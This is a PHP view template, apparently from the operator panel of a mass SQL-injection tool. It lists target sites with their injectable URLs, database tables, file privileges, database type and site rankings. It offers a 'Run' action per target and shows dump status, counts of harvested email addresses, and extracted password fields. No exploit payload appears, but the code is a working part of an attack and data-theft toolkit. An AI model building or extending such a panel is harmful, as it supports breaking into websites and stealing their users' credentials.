﻿	<!-- START CONTENT -->
	<div id="content">
	


	<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('date', 'date')?></span>
	<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('method', 'method')?></span>
	<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('country', 'country')?></span>

	<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('alexa', 'alexa')?></span>
	<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('pr', 'pr')?></span>
	<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('tic', 'tic')?></span>
	<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('file_priv', 'file_priv')?></span>

	<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('tables', 'tables')?></span>
	<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('link', 'link')?></span>
	<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('id', 'post.id')?></span>
	
	
	<!--<span class="btn_simple page_btn fr">Sort by:</span>-->

		<div class="clear"></div>

		<table class="table no-nowrap" width='90%'>
			<thead>
				<th class="center" style="width:100px;">DOMEN</th>
				<th class="center" style="width:6px;">U</th>
				<th class="center">TABLES</th>
	
				<th class="center">PRIV</th>
				<th class="center">TIC</th>
				<th class="center" >PR</th>
				<th class="center" >AlEXA</th>
	
				<th class="center" >COUNTRY</th>
				<th class="center">METHOD</th>
				<th class="center">TYPEDB</th>
				<th class="center" >DATE</th>
				<th class="center" >CLICK</th>
			</thead>
			<tbody>
			
				
			
				<? if(count($data)==0){ ?>
					<tr>
						<td colspan="4" class="center">No rows to display</td>
					</tr>
				<? }else{ ?>
					<? foreach ($data as $value){ ?>
					
					<?php if($value['Filed'][0] !='')
					{
						echo '<tr style="background-color:#ddd;" id="data'.$value['Post']['id'].'">';
					}else{
						echo '<tr id="data'.$value['Post']['id'].'">';
					
					}?>
					
						<? $f = parse_url($value['Post']['gurl']);?>
						<td  class="center" style="font-size:10px;"> <div style="word-wrap: break-word;width: 150px;" class="red"><?=$html->link($value['Post']['domen'],$http .'://'.$value['Post']['domen'],array('target'=>'_blank'));?></div></td>
						
						<?php
							$http = str_replace('://','',$value['Post']['http']);
						?>
						<td class="center" style="font-size:10px;"> <div style="word-wrap: break-word;width: 6px;"><?=$html->link('u',$http.'://'.$value['Post']['url'],array('target'=>'_blank'));?></div></td>
						
						<td class="center" style="font-size:10px;"> <div style="word-wrap: break-word;width: 100px;"><?=$value['Post']['tables']?></div></td>
					
						<td class="center" style="font-size:10px;"><?=$value['Post']['file_priv']?></td>
						<td class="center" style="font-size:10px;"><?
						if($value['Post']['tic']==-1){
							echo 'n/a';
						}else{
							echo $value['Post']['tic'];
						}
						
						?></td>
						<td class="center" style="font-size:10px;"><?=$value['Post']['pr']?></td>
						<td class="center" style="font-size:10px;"><? echo $value['Post']['alexa'];?></td>
						
							
						
						
						
			
						
						<?
						if($value['Post']['country'] == 'unkown' or $value['Post']['country'] == '0' )
						{
							$cc = 'unkown';
					
						}elseif($value['Post']['country'] == 'EU'){
							$cc ='EU';
						}
						else{
							$cc = '<img src=/flags/'.$value['Post']['country'].'.gif>';
						}?>
						
						<td class="center" style="font-size:10px;"><?=$cc;?></td>
						<td class="center" style="font-size:10px;"><?=$value['Post']['find']?></td>
						
						
						<? 
						
						if(preg_match("/microsoft/i",$value['Post']['version']))
						{
						?>
							<td class="center" style="font-size:10px;color:blue;">mssql 100%</td>
						<?
						}else{?>
							<td class="center" style="font-size:10px;color:red">mysql 100%</td>
						<?}
						
							
						?>
						
						
						
						<td class="center" style="font-size:10px;"><?=$value['Post']['date']?></td>
						<td width="70">
							<?=$this->Html->link($this->Html->image("curl.png", array("alt" => "Run")),array('action'=>'krutaten/'.$value['Post']['id'].'/load'),array('escape' => false,'class' => 'icon','title'=>'Run'))?>		
							<?=$ajax->link($this->Html->image("delete.png", array("alt" => "Move to bad")), '/posts/shlak/'.$value['Post']['id'],array('class'=>'icon','title'=>'Move to bad','escape' => false,'update'=>'data'.$value['Post']['id']))?>
						</td>
					</tr>
					
				
					
					<?php  if($value['Filed'][0] !=''){
					
						foreach($value['Filed'] as $val)
						{
						
						echo "<tr style='background-color:#ccc;' id='data".$val['id']."'><td colspan='10'>";
						echo "<span style='font-size:12px;color:red;'>ID: </span>".$val['id']."</span> ";;
						echo " || <span style='font-size:12px;color:red;'>  Found mail:</span> <span style='font-size:15px;color:blue;'>".$val['count']."</span>";
						
					
						
						echo " || <span style='font-size:12px;color:red;'>  Download status:</span> ";
						
						
						if($val['get']==2){
							echo "<span style='font-size:15px;color:blue;'>Finished </span>";
						}elseif($val['get']==3){
							echo "<span style='font-size:15px;color:blue;'>Broken </span>";
						}elseif($val['get']==''){
							echo "<span style='font-size:15px;color:blue;'>Don't start </span>";
						}elseif($val['get']==1){ 
							echo 'Download'.$this->Html->image("loader.gif", array("alt" => "Check later"));
						}
						
						
						//echo " || <span style='font-size:12px;color:red;'>Multi:</span><span style='font-size:15px;color:blue;'> ".$value['Filed'][0]['multi']."</span> ";
						echo " || <span style='font-size:12px;font-weight:700'>".$val['table'].'.'.$val['label'].'</span><span class="green" style="font-weight:700">'.$val['password'].'</span>	';
						
									
							echo '<td width="60">'.$ajax->link($this->Html->image("delete.png", array("alt" => "Move to bad")), '/posts/shlak3/'.$val['id'],array('class'=>'icon','title'=>'Move to bad','escape' => false,'update'=>'data'.$val['id'])).' <a href="/posts/view_iframe/'.$val['id'].'" target="_blank"><span style="font-size:12px;color:red;">>></a></span></td>';
						
						
						echo "</td></tr>";
					}}?>
					
					
					
					<? } ?>
				<? } ?>
			</tbody>
		</table>
	
		<span class="btn_simple btn_green page_btn fl"><?=$paginator->prev('« Back ', " "," ", array('class' => 'disabled'))?></span>
		<span class="btn_simple page_btn fl"><?=$paginator->counter(array('separator'=>' of '))?></span>
		<span class="btn_simple btn_green page_btn fl"><?=$paginator->next(' Forward »'," "," ", array('class' => 'disabled'))?></span>

		<div class="clear"></div>

		
		<br/><br/>
	</div>
	<!-- STOP CONTENT -->